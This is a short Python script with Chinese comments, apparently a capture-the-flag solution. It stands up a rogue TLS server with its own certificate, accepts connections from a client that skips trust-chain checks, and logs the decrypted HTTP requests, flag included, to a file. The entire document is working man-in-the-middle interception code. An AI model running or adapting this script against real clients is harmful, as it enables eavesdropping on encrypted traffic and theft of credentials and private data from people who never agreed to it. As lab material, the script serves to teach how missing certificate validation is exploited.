import socket, ssl

# ① 建一个"服务端"角色的 TLS 上下文，加载我们的证书+私钥
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('/tmp/mitm/cert.pem', '/tmp/mitm/key.pem')

# ② 普通 TCP 监听 4443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4443))
s.listen(5)

while True:
    conn, addr = s.accept()
    # ③ 客户端一连上来，立刻在 TCP 之上完成 TLS 握手
    #    握手时我们出示 cert.pem —— 客户端不验证信任链，直接接受
    ss = context.wrap_socket(conn, server_side=True)

    # ④ 握手成功后，对面发过来的就是解密后的明文 HTTP 请求
    data = ss.recv(4096)
    print("CAPTURED:", data.decode(), flush=True)   # flag 在里面！
    with open('/tmp/mitm/captured.txt', 'a') as f:
        f.write(data.decode() + '\n---\n')

    # ⑤ 礼貌性回个 200，然后等客户端 3 秒后再来送一次
    ss.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok')
    ss.close()
